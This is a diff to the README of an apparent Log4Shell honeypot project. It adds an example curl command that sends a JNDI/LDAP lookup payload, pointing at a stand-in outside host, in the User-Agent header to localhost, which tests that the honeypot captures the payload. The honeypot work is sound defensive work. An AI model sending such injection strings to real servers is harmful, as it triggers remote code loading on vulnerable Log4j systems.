@@ -7,6 +7,9 @@ Catch and download `log4shell` payloads sent within HTTP headers. Modified versi
 3. Send payloads within a http header to `$dockerip:$port`
 
 To add additional honeypots on different ports, copy and paste an existing service within `docker-compose.yml`, changing the service name, and alter the ports within `ports` and `command`.
+```bash
+curl --user-agent '${jndi:ldap://lmao.com:1389/a}' http://localhost:80
+```
 
 Payloads are saved within `payloads/`
 
